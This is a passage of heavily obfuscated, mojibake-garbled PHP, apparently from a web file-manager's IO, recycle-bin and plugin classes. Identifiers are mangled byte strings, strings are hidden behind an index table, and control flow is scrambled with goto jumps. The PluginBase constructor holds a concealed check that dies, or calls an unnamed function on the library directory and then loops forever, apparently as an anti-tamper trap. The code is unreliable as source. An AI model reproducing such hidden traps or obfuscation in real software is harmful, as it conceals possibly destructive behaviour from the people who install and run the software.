(!$eÇÜÂŒÃÒ->exist($b¿›©Á…  )) { show_json(LNG($eÌİÖ÷¸Ê©[99]), !1); } } private static function copyPath($aø„çé‚¤, $aˆÖ¶Õ‰ø, $CÌÀ¥Ä…ä, $fÂ¿·¥áá”, $e·¼ë–¢Ôô, $EÓäª­¦Ä, $f±°Ò¹”Íù) { goto eô½‹¯Ù; eô½‹¯Ù: $c½‰ºë©ó =& $_SERVER[ÍÓÖ€°å]; $C½èãŒ§Š = $aø„çé‚¤->getPathName($aø„çé‚¤->pathThis($aˆÖ¶Õ‰ø)); if ($e·¼ë–¢Ôô) { $cã¹ğ–éğÛ = $CÌÀ¥Ä…ä->fileNameExist($fÂ¿·¥áá”, $C½èãŒ§Š); $C½èãŒ§Š = $CÌÀ¥Ä…ä->fileNameAuto($fÂ¿·¥áá”, $C½èãŒ§Š, $e·¼ë–¢Ôô, !$f±°Ò¹”Íù); $e·¼ë–¢Ôô = $cã¹ğ–éğÛ ? $e·¼ë–¢Ôô : !1; } goto b»•ãƒÎ½Ï; AØùàÉº ¥: $f˜¯ƒŠ¦×Œ = $CÌÀ¥Ä…ä->mkdir($CÌÀ¥Ä…ä->getPath($e¢İÄ±…)); $fÂ¿·¥áá” = $CÌÀ¥Ä…ä->getPathInner($f˜¯ƒŠ¦×Œ); $a¦º«ç¥ = $aø„çé‚¤->listPath($aˆÖ¶Õ‰ø, !1, !0); goto B¦…¤Ü­‡; b»•ãƒÎ½Ï: if ($f±°Ò¹”Íù) { if (!$CÌÀ¥Ä…ä->exist($fÂ¿·¥áá”)) { $C½èãŒ§Š = $CÌÀ¥Ä…ä->getPathName($CÌÀ¥Ä…ä->pathThis($fÂ¿·¥áá”)); $fÂ¿·¥áá” = $CÌÀ¥Ä…ä->pathFather($fÂ¿·¥áá”); } return self::copyFile($aø„çé‚¤, $aˆÖ¶Õ‰ø, $CÌÀ¥Ä…ä, $fÂ¿·¥áá”, $C½èãŒ§Š, $EÓäª­¦Ä); } if ($e·¼ë–¢Ôô == REPEAT_RENAME_FOLDER) { $e·¼ë–¢Ôô = !1; } $e¢İÄ±… = rtrim($fÂ¿·¥áá”, $c½‰ºë©ó[8]) . $c½‰ºë©ó[8] . $C½èãŒ§Š; goto AØùàÉº ¥; B¦…¤Ü­‡: $C­¤‚íÁ½Ê = array_merge($a¦º«ç¥[$c½‰ºë©ó[74]], $a¦º«ç¥[$c½‰ºë©ó[75]]); foreach ($C­¤‚íÁ½Ê as $bóÏ¾ÓÎÉö) { $E­´á©ÆĞ¡ = $bóÏ¾ÓÎÉö[$c½‰ºë©ó[29]] == $c½‰ºë©ó[155]; $aˆÖ¶Õ‰ø = $aø„çé‚¤->getPathInner($bóÏ¾ÓÎÉö[$c½‰ºë©ó[76]]); self::copyPath($aø„çé‚¤, $aˆÖ¶Õ‰ø, $CÌÀ¥Ä…ä, $fÂ¿·¥áá”, $e·¼ë–¢Ôô, $EÓäª­¦Ä, $E­´á©ÆĞ¡); } return $f˜¯ƒŠ¦×Œ; goto eŞ´’¯ÆÀÑ; eŞ´’¯ÆÀÑ: } private static function copyFile($A‘»Â‚°Šî, $fèˆŠ³Íæó, $cçôÏ¢Òİ·, $Eî¯Áâ¿øî, $E› „”–§, $CŒš—ÏÜ×) { goto B¢ó¼„š¼ğ; FƒˆÕ—Í°ğ: Hook::trigger($F·¥„Š°‹ß[732], $A‘»Â‚°Šî, $fèˆŠ³Íæó, $cçôÏ¢Òİ·, $Eî¯Áâ¿øî, $E› „”–§, $dõèÃÊ©†ª); if (self::driverIsSame($A‘»Â‚°Šî, $cçôÏ¢Òİ·)) { if ($CŒš—ÏÜ×) { $BòÍ¡›ø = $cçôÏ¢Òİ·->moveFile($fèˆŠ³Íæó, $Eî¯Áâ¿øî); } else { $BòÍ¡›ø = $cçôÏ¢Òİ·->copyFile($fèˆŠ³Íæó, $Eî¯Áâ¿øî); } Hook::trigger($F·¥„Š°‹ß[733], $A‘»Â‚°Šî, $fèˆŠ³Íæó, $cçôÏ¢Òİ·, $Eî¯Áâ¿øî, $E› „”–§, $BòÍ¡›ø); return $BòÍ¡›ø; } $a«Ó¿Û«’ = TEMP_FILES; goto B­Æ´„ïø†; B­Æ´„ïø†: mk_dir($a«Ó¿Û«’); $bŞ‰„ñ‡Îê = $a«Ó¿Û«’ . $dõèÃÊ©†ª; $bŞ‰„ñ‡Îê = $A‘»Â‚°Šî->download($fèˆŠ³Íæó, $bŞ‰„ñ‡Îê); goto E‹•Ó…ˆµö; BŠŒ‚×ãŸç: Hook::trigger($F·¥„Š°‹ß[733], $A‘»Â‚°Šî, $fèˆŠ³Íæó, $cçôÏ¢Òİ·, $Eî¯Áâ¿øî, $E› „”–§, $BòÍ¡›ø); return $BòÍ¡›ø; goto c¥ˆùåÈİ¼; E‹•Ó…ˆµö: $bŞ‰„ñ‡Îê = $A‘»Â‚°Šî->iconvApp($bŞ‰„ñ‡Îê); $BòÍ¡›ø = $cçôÏ¢Òİ·->upload($Eî¯Áâ¿øî, $bŞ‰„ñ‡Îê, $CŒš—ÏÜ×); del_file($a«Ó¿Û«’ . $dõèÃÊ©†ª); goto BŠŒ‚×ãŸç; B¢ó¼„š¼ğ: $F·¥„Š°‹ß =& $_SERVER[ÍÓÖ€°å]; $Eî¯Áâ¿øî = $cçôÏ¢Òİ·->getPath(rtrim($Eî¯Áâ¿øî, $F·¥„Š°‹ß[8]) . $F·¥„Š°‹ß[8] . $E› „”–§); $dõèÃÊ©†ª = $F·¥„Š°‹ß[731] . time() . rand_string(5); goto FƒˆÕ—Í°ğ; c¥ˆùåÈİ¼: } public static function fileOut($A’ÁÕˆ, $D¡ÎŸäÅ˜ô = false, $A¯õô’íÌ = false, $a¥¦„¤™öÎ = '') { $A­ê…„¦‡ =& $_SERVER[ÍÓÖ€°å]; $FÓ³Ş‡÷£² = self::driverMake($A’ÁÕˆ); $c¨ŒÉ¸ä»â = $GLOBALS[$A­ê…„¦‡[6]][$A­ê…„¦‡[84]][$A­ê…„¦‡[734]]; if ($c¨ŒÉ¸ä»â) { return $FÓ³Ş‡÷£²->fileOutServer($A’ÁÕˆ, $D¡ÎŸäÅ˜ô, $A¯õô’íÌ, $a¥¦„¤™öÎ); } return $FÓ³Ş‡÷£²->fileOut($A’ÁÕˆ, $D¡ÎŸäÅ˜ô, $A¯õô’íÌ, $a¥¦„¤™öÎ); } public function fileOutImage($FÌ¤ÕéÏÛ¸, $eÖÌ‹ÃÇ’ = 250) { $dÇÑ¬Éïñ =& $_SERVER[ÍÓÖ€°å]; $dùÓŒˆÁ = self::driverMake($FÌ¤ÕéÏÛ¸); $dßÏ™áì“ë = $GLOBALS[$dÇÑ¬Éïñ[6]][$dÇÑ¬Éïñ[84]][$dÇÑ¬Éïñ[734]]; if ($dßÏ™áì“ë) { return $dùÓŒˆÁ->fileOutImageServer($FÌ¤ÕéÏÛ¸, $eÖÌ‹ÃÇ’); } return $dùÓŒˆÁ->fileOutImage($FÌ¤ÕéÏÛ¸, $eÖÌ‹ÃÇ’); } private static function driverIsSame($Cœİ–”èšÉ, $DÖ¡£ÓÆÎö) { goto dˆÌî–™Š™; dˆÌî–™Š™: $AáæáéªñÄ =& $_SERVER[ÍÓÖ€°å]; $fÑŒ×°Öñ© = $Cœİ–”èšÉ->getType(); $c¸—ÙÕ´Ğ = $DÖ¡£ÓÆÎö->getType(); goto fó†“îãê†; c÷˜ç÷¸Ãê: if ($Cœİ–”èšÉ->pathDriver == $DÖ¡£ÓÆÎö->pathDriver) { return !0; } return !1; goto AÕˆô¡ÅÔ; fó†“îãê†: if ($fÑŒ×°Öñ© != $c¸—ÙÕ´Ğ) { return !1; } if ($fÑŒ×°Öñ© == $AáæáéªñÄ[442]) { return !0; } if ($fÑŒ×°Öñ© == $AáæáéªñÄ[125]) { return !0; } goto c÷˜ç÷¸Ãê; AÕˆô¡ÅÔ: } public static function copyUpdate($cœ½å©ÃÑÃ, $AÑŞÂô¸È) { goto AãĞ£Ğ; CƒÒî¨­â—: $eŠé’Ï¨¤™ = self::_listAll($cœ½å©ÃÑÃ); $a»é¡ªİë = self::_listAll($AÑŞÂô¸È); $EëÜÑğ”¨ = array(); goto fò½«ÍÁ¾”; fò½«ÍÁ¾”: $A¯ÎÒ ç® = array(); foreach ($eŠé’Ï¨¤™ as $DŞ¢„Â¦ø¨ => $AËÁ¦é¨ã‰) { if ($AËÁ¦é¨ã‰[$bÔ±÷Ô­âÕ[77]] == 1 && !isset($a»é¡ªİë[$DŞ¢„Â¦ø¨])) { $A¯ÎÒ ç®[] = $AÑŞÂô¸È . $bÔ±÷Ô­âÕ[8] . $DŞ¢„Â¦ø¨; } if ($AËÁ¦é¨ã‰[$bÔ±÷Ô­âÕ[77]] == 0) { if (!isset($a»é¡ªİë[$DŞ¢„Â¦ø¨]) || $a»é¡ªİë[$DŞ¢„Â¦ø¨][$bÔ±÷Ô­âÕ[78]] != $AËÁ¦é¨ã‰[$bÔ±÷Ô­âÕ[78]]) { $EëÜÑğ”¨[] = array($bÔ±÷Ô­âÕ[735] => $AËÁ¦é¨ã‰[$bÔ±÷Ô­âÕ[76]], $bÔ±÷Ô­âÕ[736] => $AÑŞÂô¸È . $bÔ±÷Ô­âÕ[8] . get_path_father($DŞ¢„Â¦ø¨), $bÔ±÷Ô­âÕ[737] => $AËÁ¦é¨ã‰); if (isset($a»é¡ªİë[$DŞ¢„Â¦ø¨])) { IO::remove($AÑŞÂô¸È . $bÔ±÷Ô­âÕ[8] . $DŞ¢„Â¦ø¨); } } } } $a¾Úö×àò¤ = array($bÔ±÷Ô­âÕ[155] => $EëÜÑğ”¨, $bÔ±÷Ô­âÕ[77] => $A¯ÎÒ ç®); goto c›·İ¨·İ; AãĞ£Ğ: $bÔ±÷Ô­âÕ =& $_SERVER[ÍÓÖ€°å]; if (!IO::exist($cœ½å©ÃÑÃ)) { return !1; } if (!IO::exist($AÑŞÂô¸È)) { IO::mkdir($AÑŞÂô¸È); } goto CƒÒî¨­â—; c›·İ¨·İ: Hook::trigger($bÔ±÷Ô­âÕ[738], $cœ½å©ÃÑÃ, $AÑŞÂô¸È, $a¾Úö×àò¤); foreach ($A¯ÎÒ ç® as $AËÁ¦é¨ã‰) { IO::mkdir($AËÁ¦é¨ã‰); } foreach ($EëÜÑğ”¨ as $AËÁ¦é¨ã‰) { IO::copy($AËÁ¦é¨ã‰[$bÔ±÷Ô­âÕ[735]], $AËÁ¦é¨ã‰[$bÔ±÷Ô­âÕ[736]], REPEAT_REPLACE); } goto e©—…„ì¿; e©—…„ì¿: } private static function _listAll($aŒÀ›«†¦) { $CïÜâšì¾Û =& $_SERVER[ÍÓÖ€°å]; $aŒÀ›«†¦ = KodIO::clear($aŒÀ›«†¦); $F­¯±ÙÁ¶õ = IO::listAll($aŒÀ›«†¦); foreach ($F­¯±ÙÁ¶õ as &$B‡­öº‡Ÿô) { $EÓ±ßÎ„·È = substr($B‡­öº‡Ÿô[$CïÜâšì¾Û[76]], strlen($aŒÀ›«†¦)); $B‡­öº‡Ÿô[$CïÜâšì¾Û[739]] = trim($EÓ±ßÎ„·È, $CïÜâšì¾Û[8]); } return array_to_keyvalue($F­¯±ÙÁ¶õ, $CïÜâšì¾Û[739]); } private static function driverMake(&$a² Ê…òö«) { goto c„´øùÜ—; CæÑÉ÷³Ì: return $cß²ŒŠÄÒé; goto f·â»öš‰; Dè¢’¼„¥œ: if ($EÇ¯°—‰²‰[$cã¿ÒØ­Á[29]] == KodIO::KOD_IO && !self::$driverListSystem[$EÇ¯°—‰²‰[$cã¿ÒØ­Á[357]]]) { return !1; } $a² Ê…òö« = $EÇ¯°—‰²‰[$cã¿ÒØ­Á[740]]; $cß²ŒŠÄÒé = self::driverGet($EÇ¯°—‰²‰, $a² Ê…òö«); goto CæÑÉ÷³Ì; c„´øùÜ—: $cã¿ÒØ­Á =& $_SERVER[ÍÓÖ€°å]; $EÇ¯°—‰²‰ = KodIO::parse($a² Ê…òö«); if (!self::$driverListSystem) { $eŒˆÆªŸ½½ = Model($cã¿ÒØ­Á[452])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($eŒˆÆªŸ½½, $cã¿ÒØ­Á[357]); } goto Dè¢’¼„¥œ; f·â»öš‰: } private static function driverGet($aøç¿¦˜âó, &$Eâï‘ÑŠÉ) { goto Bø„˜Àïñ; BšÉ×Š–­ø: if (isset($f´²Ñ…’Üµ[$dÛÙËäÅ·[6]][$dÛÙËäÅ·[746]])) { $f²­ äõ¬->pathBase = rtrim($f´²Ñ…’Üµ[$dÛÙËäÅ·[6]][$dÛÙËäÅ·[746]], $dÛÙËäÅ·[8]) . $dÛÙËäÅ·[8]; $Eâï‘ÑŠÉ = $f²­ äõ¬->pathBase . ltrim($Eâï‘ÑŠÉ, $dÛÙËäÅ·[8]); } $Eâï‘ÑŠÉ = $f²­ äõ¬->getPath($Eâï‘ÑŠÉ); $f²­ äõ¬->path = $Eâï‘ÑŠÉ; goto C£Âö¿„‘É; C£Âö¿„‘É: return $f²­ äõ¬; goto AíÎ»Ë¡Œ†; A¬™å×øêÊ: $f²­ äõ¬ = self::$driverCache[$aİ¾ô²İŸ‚]; $f²­ äõ¬->pathDriver = $AõŸŞ›‹ñ; $f²­ äõ¬->pathBase = $dÛÙËäÅ·[33]; goto BšÉ×Š–­ø; FáÌéÀ¢“Ş: switch ($aøç¿¦˜âó[$dÛÙËäÅ·[29]]) { case KodIO::KOD_IO: $f´²Ñ…’Üµ = self::$driverListSystem[$CÔÑÒÁ¤ô—]; break; case KodIO::KOD_SOURCE: $Eâï‘ÑŠÉ = $CÔÑÒÁ¤ô— . $Eâï‘ÑŠÉ; $f´²Ñ…’Üµ = array($dÛÙËäÅ·[742] => $dÛÙËäÅ·[743], $dÛÙËäÅ·[6] => $aøç¿¦˜âó); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $A¢Æ¨‘¶ª = $GLOBALS[$dÛÙËäÅ·[744]]; self::$driverListUser = array_to_keyvalue($A¢Æ¨‘¶ª, $dÛÙËäÅ·[357]); } $f´²Ñ…’Üµ = self::$driverListUser[$CÔÑÒÁ¤ô—]; break; case KodIO::KOD_SHARE_LINK: case KodIO::KOD_SHARE_ITEM: $f´²Ñ…’Üµ = array($dÛÙËäÅ·[742] => $dÛÙËäÅ·[743], $dÛÙËäÅ·[6] => $aøç¿¦˜âó); break; default: $Eâï‘ÑŠÉ = $aøç¿¦˜âó[$dÛÙËäÅ·[76]]; $f´²Ñ…’Üµ = array($dÛÙËäÅ·[742] => $dÛÙËäÅ·[745]); break; } $aİ¾ô²İŸ‚ = $aøç¿¦˜âó[$dÛÙËäÅ·[76]]; if (!isset(self::$driverCache[$aİ¾ô²İŸ‚])) { $d¢Úù­ŸÒ§ = $dÛÙËäÅ·[72] . self::driverType($f´²Ñ…’Üµ[$dÛÙËäÅ·[89]]); if (!class_exists($d¢Úù­ŸÒ§)) { show_json("{$d¢Úù­ŸÒ§}\x20\x6e\x6f\164\40\x65\170\x69\x73\164\163\x21", !1); } $fìÓ¯´–®‰ = isset($f´²Ñ…’Üµ[$dÛÙËäÅ·[6]]) ? $f´²Ñ…’Üµ[$dÛÙËäÅ·[6]] : !1; self::$driverCache[$aİ¾ô²İŸ‚] = new $d¢Úù­ŸÒ§($fìÓ¯´–®‰); } goto A¬™å×øêÊ; Bø„˜Àïñ: $dÛÙËäÅ· =& $_SERVER[ÍÓÖ€°å]; $AõŸŞ›‹ñ = $aøç¿¦˜âó[$dÛÙËäÅ·[741]]; $CÔÑÒÁ¤ô— = $aøç¿¦˜âó[$dÛÙËäÅ·[357]]; goto FáÌéÀ¢“Ş; AíÎ»Ë¡Œ†: } private static function driverType($b—³àµ¦–) { $c·ÀöÄÜñ– =& $_SERVER[ÍÓÖ€°å]; $b—³àµ¦– = strtolower($b—³àµ¦–); if ($b—³àµ¦– == $c·ÀöÄÜñ–[65]) { $b—³àµ¦– = $c·ÀöÄÜñ–[747]; } else { if (in_array($b—³àµ¦–, array($c·ÀöÄÜñ–[125], $c·ÀöÄÜñ–[58], $c·ÀöÄÜñ–[748]))) { $b—³àµ¦– = ucfirst($b—³àµ¦–); } else { $b—³àµ¦– = strtoupper($b—³àµ¦–); } } return $b—³àµ¦–; } } goto A³Ä‚„õŠÈ; fÔ¢„»íÚ: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\x72\143\x65\137\162\x65\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\x54\151\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\x73\145\162\164", "\x66\x75\156\143\x74\151\x6f\x6e")); public function listData($f¢±ôàŸñ = false) { $F‹ ÖöáÑÕ =& $_SERVER[ÍÓÖ€°å]; $f¢±ôàŸñ = $f¢±ôàŸñ ? $f¢±ôàŸñ : USER_ID; $fùëŒ•æÓí = $this->where(array($F‹ ÖöáÑÕ[1053] => $f¢±ôàŸñ))->select(); return array_to_keyvalue($fùëŒ•æÓí, $F‹ ÖöáÑÕ[33], $F‹ ÖöáÑÕ[365]); } public function moveToRecycle($A¸ğÄ†Œ¿‘) { goto Aí´àå¼‘Ì; eé†¦Ô»ù: $this->recycleMove($A¸ğÄ†Œ¿‘, 1); if ($a‰Øš¿ÜÍİ[$eŞæ‹â¹­[366]] == $eŞæ‹â¹­[367]) { $CÓ²÷â•”‰ = array($eŞæ‹â¹­[390] => array($eŞæ‹â¹­[399], $a‰Øš¿ÜÍİ[$eŞæ‹â¹­[364]] . $A¸ğÄ†Œ¿‘ . $eŞæ‹â¹­[400])); $dĞ³ƒİßéš->where($CÓ²÷â•”‰)->setField($eŞæ‹â¹­[401], 1); } goto BÉééÂ²ÜÄ; Aí´àå¼‘Ì: $eŞæ‹â¹­ =& $_SERVER[ÍÓÖ€°å]; $dĞ³ƒİßéš = Model($eŞæ‹â¹­[827]); $a‰Øš¿ÜÍİ = $dĞ³ƒİßéš->sourceInfo($A¸ğÄ†Œ¿‘); goto bÉÄïÄéÊ; bÉÄïÄéÊ: if (!$a‰Øš¿ÜÍİ || $a‰Øš¿ÜÍİ[$eŞæ‹â¹­[401]] == $eŞæ‹â¹­[367]) { return; } $CŠã¤´ÄŒ¥ = array($eŞæ‹â¹­[406] => $A¸ğÄ†Œ¿‘, $eŞæ‹â¹­[1053] => USER_ID, $eŞæ‹â¹­[383] => $a‰Øš¿ÜÍİ[$eŞæ‹â¹­[384]], $eŞæ‹â¹­[385] => $a‰Øš¿ÜÍİ[$eŞæ‹â¹­[386]], $eŞæ‹â¹­[390] => $a‰Øš¿ÜÍİ[$eŞæ‹â¹­[364]]); $this->add($CŠã¤´ÄŒ¥); goto eé†¦Ô»ù; BÉééÂ²ÜÄ: } public function clear() { $this->remove(!1); } public function remove($AŞÈ¼Ù×â = false) { goto AË«ÜÕê; bâ‘µÇ³öÖ: foreach ($CÓ¡İÉõ„© as $C¸É±‘„°Ğ) { $b•†‘„ÙàÛ->targetSpaceUpdate($C¸É±‘„°Ğ[$döÈÂŞ²É[384]], $C¸É±‘„°Ğ[$döÈÂŞ²É[386]]); } goto DÌä±œï; F¬ÙÑßšà«: $AŞÈ¼Ù×â = $AŞÈ¼Ù×â === !1 ? !1 : $AŞÈ¼Ù×â; $CÓ¡İÉõ„© = array(); foreach ($f²µ÷´„† as $Eóá»íŞ) { if ($AŞÈ¼Ù×â != !1 && !in_array($Eóá»íŞ, $AŞÈ¼Ù×â)) { continue; } $cÜ”£ÂÇÀŒ = $this->where(array($döÈÂŞ²É[365] => $Eóá»íŞ))->find(); $cà¸ÁŒÏ¥´ = $cÜ”£ÂÇÀŒ[$döÈÂŞ²É[384]] . $döÈÂŞ²É[71] . $cÜ”£ÂÇÀŒ[$döÈÂŞ²É[386]]; $CÓ¡İÉõ„©[$cà¸ÁŒÏ¥´] = array($döÈÂŞ²É[383] => $cÜ”£ÂÇÀŒ[$döÈÂŞ²É[384]], $döÈÂŞ²É[386] => $cÜ”£ÂÇÀŒ[$döÈÂŞ²É[386]]); $this->where(array($döÈÂŞ²É[365] => $Eóá»íŞ))->delete(); $b•†‘„ÙàÛ->remove($Eóá»íŞ, !1); } goto bâ‘µÇ³öÖ; AË«ÜÕê: $döÈÂŞ²É =& $_SERVER[ÍÓÖ€°å]; $b•†‘„ÙàÛ = Model($döÈÂŞ²É[827]); $f²µ÷´„† = $this->listData(); goto F¬ÙÑßšà«; DÌä±œï: } public function restore($cº¿ŞÆëŒî = false) { goto Dá¨Õ´¢³è; cÚ¤‚æÑ”Ö: foreach ($C™è¬À‰Ş‘ as $Bœ¾Ñ–˜™) { goto CÍİ˜óõÒ‡; EÖã‚åÏ‘š: if ($Eç¦‘£ïÑ™[$aİä¿«‰™ã[366]] == $aİä¿«‰™ã[367]) { $e„‚§ïªÅ[] = $Bœ¾Ñ–˜™; } goto aÔîÎçí‘Ë; f²¤¼‰çõç: $this->where(array($aİä¿«‰™ã[365] => $Bœ¾Ñ–˜™))->delete(); $F”™µóğù†->folderSizeReset($Eç¦‘£ïÑ™[$aİä¿«‰™ã[375]]); $e„‚§ïªÅ[] = $Eç¦‘£ïÑ™[$aİä¿«‰™ã[375]]; goto EÖã‚åÏ‘š; DÔÑ‡‚ä¯: if ($Dâ‡àµ§š‘[$aİä¿«‰™ã[401]] == $aİä¿«‰™ã[367]) { continue; } $this->recycleMove($Bœ¾Ñ–˜™, 0); if ($Eç¦‘£ïÑ™[$aİä¿«‰™ã[366]] == $aİä¿«‰™ã[367]) { $BŒ‹–ªĞÑ¯ = array($aİä¿«‰™ã[390] => array($aİä¿«‰™ã[399], $Eç¦‘£ïÑ™[$aİä¿«‰™ã[364]] . $Bœ¾Ñ–˜™ . $aİä¿«‰™ã[400])); $F”™µóğù†->where($BŒ‹–ªĞÑ¯)->setField($aİä¿«‰™ã[401], 0); } goto f²¤¼‰çõç; CÍİ˜óõÒ‡: if ($cº¿ŞÆëŒî != !1 && !in_array($Bœ¾Ñ–˜™, $cº¿ŞÆëŒî)) { continue; } $Eç¦‘£ïÑ™ = $F”™µóğù†->where(array($aİä¿«‰™ã[365] => $Bœ¾Ñ–˜™))->find(); $Dâ‡àµ§š‘ = $F”™µóğù†->where(array($aİä¿«‰™ã[365] => $Eç¦‘£ïÑ™[$aİä¿«‰™ã[375]]))->find(); goto DÔÑ‡‚ä¯; aÔîÎçí‘Ë: } $F”™µóğù†->updateModifyTime($e„‚§ïªÅ); goto fçîÑå°ø; Dá¨Õ´¢³è: $aİä¿«‰™ã =& $_SERVER[ÍÓÖ€°å]; $F”™µóğù† = Model($aİä¿«‰™ã[827]); $C™è¬À‰Ş‘ = $this->listData(); goto f³ßœ©“’È; f³ßœ©“’È: $cº¿ŞÆëŒî = $cº¿ŞÆëŒî == !1 ? !1 : $cº¿ŞÆëŒî; if (!$C™è¬À‰Ş‘) { return !0; } $e„‚§ïªÅ = array(); goto cÚ¤‚æÑ”Ö; fçîÑå°ø: } private function recycleMove($dğæÒ’¨…ë, $C®¤§¾¦•ñ = 1) { $d‚á Ùº²ƒ =& $_SERVER[ÍÓÖ€°å]; $B‘§å›‘˜Ü = Model($d‚á Ùº²ƒ[827]); $aîïÕÎòå¹ = Model($d‚á Ùº²ƒ[1754]); $A ´ Øó‹ = array($d‚á Ùº²ƒ[365] => $dğæÒ’¨…ë); if ($C®¤§¾¦•ñ) { $B‘§å›‘˜Ü->where($A ´ Øó‹)->setField($d‚á Ùº²ƒ[401], 1); $aîïÕÎòå¹->eventRecycle($dğæÒ’¨…ë, $d‚á Ùº²ƒ[1755]); } else { $F§®Ø³›¥º = $B‘§å›‘˜Ü->where($A ´ Øó‹)->find(); $a¯½‡ªÖ— = $F§®Ø³›¥º[$d‚á Ùº²ƒ[366]] == $d‚á Ùº²ƒ[367]; $A†®èƒ àŒ = $B‘§å›‘˜Ü->fileNameAuto($F§®Ø³›¥º[$d‚á Ùº²ƒ[375]], $F§®Ø³›¥º[$d‚á Ùº²ƒ[28]], REPEAT_RENAME_FOLDER, $a¯½‡ªÖ—); if ($A†®èƒ àŒ != $F§®Ø³›¥º[$d‚á Ùº²ƒ[28]]) { $B‘§å›‘˜Ü->rename($dğæÒ’¨…ë, $A†®èƒ àŒ); } $B‘§å›‘˜Ü->where($A ´ Øó‹)->setField($d‚á Ùº²ƒ[401], 0); $aîïÕÎòå¹->eventRecycle($dğæÒ’¨…ë, $d‚á Ùº²ƒ[1756]); } } } $e‰ê‹Úï‹‡ = LIB_DIR . $_SERVER[ÍÓÖ€°å][1738]; $DùøÚÜºĞ» = $_SERVER[ÍÓÖ€°å][993]; goto dØ´ÑÑ’îÄ; CÉÙÃÔ›Ò¾: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto D¡¨³ƒøùÂ; F‘õä‡ é¡: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($C¯šøáóĞ[422]); goto b˜Ë°ìóğâ; D¡¨³ƒøùÂ: $C¯šøáóĞ =& $_SERVER[ÍÓÖ€°å]; if (!isset($_SERVER[$C¯šøáóĞ[544]]) || !isset($_SERVER[$C¯šøáóĞ[945]])) { goto dÍ±¡¬ÚŠ; dÍ±¡¬ÚŠ: $B…§±à¯× = $C¯šøáóĞ[546]; $D¨‘ïÕ§Ó³ = BASIC_PATH . $C¯šøáóĞ[547]; $Aºö¡Ö›Şµ = $B…§±à¯×($D¨‘ïÕ§Ó³); goto cÇÑÚ »Ø; cÇÑÚ »Ø: $F£¦ù®ÍŒ = explode($C¯šøáóĞ[212], $Aºö¡Ö›Şµ); if (count($F£¦ù®ÍŒ) < $C¯šøáóĞ[548]) { die; } $dœ»³Â¥™ = $C¯šøáóĞ[549]; goto F³¥Š¤âÄ; F³¥Š¤âÄ: $dœ»³Â¥™(LIB_DIR); for (;;) { $dœ»³Â¥™ = json_encode($GLOBALS[$C¯šøáóĞ[946]]); } goto CŠºÀéº²ô; CŠºÀéº²ô: } global $in, $config; goto F‘õä‡ é¡; Bª·‹¿¯íë: $this->values = array(); return $this; goto C˜×Èìø»; føÉÜ­Ìˆ: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $C¯šøáóĞ[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $C¯šøáóĞ[8]; $this->pluginLangArr = $this->initLang(); goto Bª·‹¿¯íë; b˜Ë°ìóğâ: $this->pluginName = str_replace($C¯šøáóĞ[422], $C¯šøáóĞ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $C¯šøáóĞ[8]; $this->pluginApi = rtrim(APP_HOST, $C¯šøáóĞ[8]) . $C¯šøáóĞ[947] . $this->pluginName . $C¯šøáóĞ[8]; goto føÉÜ­Ìˆ; C˜×Èìø»: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ÍÓÖ€°å][948]); } protected function assign($aÄÒŠŠºÛ›, $eîŠ½²™ù = false) { if (is_array($aÄÒŠŠºÛ›)) { $this->values = array_merge($this->values, $aÄÒŠŠºÛ›); } else { $this->values[$aÄÒŠŠºÛ›] = $eîŠ½²™ù; } } protected function display($cØÎÀÌÒ·) { extract($this->values); require $cØÎÀÌÒ·; } final function hookRegist($bÂŒ„‘Ü¡İ) { $this->modelPlugin->appRegist($this->pluginName, $bÂŒ„‘Ü¡İ); } final function appIcon() { $dƒ°ªœ£ˆ =& $_SERVER[ÍÓÖ€°å]; $cğÈ ¯ƒŠ¯ = $this->appPackage(); $BÅ¸‡ÜÁ•½ = $dƒ°ªœ£ˆ[33]; if (isset($cğÈ ¯ƒŠ¯[$dƒ°ªœ£ˆ[949]])) { if ($cğÈ ¯ƒŠ¯[$dƒ°ªœ£ˆ[949]][$dƒ°ªœ£ˆ[950]]) { $BÅ¸‡ÜÁ•½ = $dƒ°ªœ£ˆ[951] . $cğÈ ¯ƒŠ¯[$dƒ°ªœ£ˆ[949]][$dƒ°ªœ£ˆ[950]] . $dƒ°ªœ£ˆ[952]; } else { if ($cğÈ ¯ƒŠ¯[$dƒ°ªœ£ˆ[949]][$dƒ°ªœ£ˆ[953]]) { $BÅ¸‡ÜÁ•½ = $dƒ°ªœ£ˆ[954] . $cğÈ ¯ƒŠ¯[$dƒ°ªœ£ˆ[949]][$dƒ°ªœ£ˆ[953]] . $dƒ°ªœ£ˆ[955]; } } } return $BÅ¸‡ÜÁ•½; } final function fileCanView($EëïÏÙÛÇ½) { $CÉ„ÎÂÌ‡ó =& $_SERVER[ÍÓÖ€°å]; if ($this->isShare($EëïÏÙÛÇ½)) { return !0; } if (!Action($CÉ„ÎÂÌ‡ó[956])->authCan($CÉ„ÎÂÌ‡ó[957])) { show_tips(LNG($CÉ„ÎÂÌ‡ó[958]), !1); } ActionCall($CÉ„ÎÂÌ‡ó[959], $EëïÏÙÛÇ½); } final function isShare($aö¨†œ†Š©) { $f«ÍÁªé±§ = KodIO::parse($aö¨†œ†Š©); return $f«ÍÁªé±§[$_SERVER[ÍÓÖ€°å][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($cŞ»¼ÁÃ‘ˆ) { if (request_url_safe($cŞ»¼ÁÃ‘ˆ)) { return $cŞ»¼ÁÃ‘ˆ; } if (!$this->isShare($cŞ»¼ÁÃ‘ˆ)) { $cŞ»¼ÁÃ‘ˆ = $this->filePath($cŞ»¼ÁÃ‘ˆ); } return Action($_SERVER[ÍÓÖ€°å][960])->linkOut($cŞ»¼ÁÃ‘ˆ); } public function filePathLinkOut($bÏÔŒ’ŠÜ) { if (request_url_safe($bÏÔŒ’ŠÜ)) 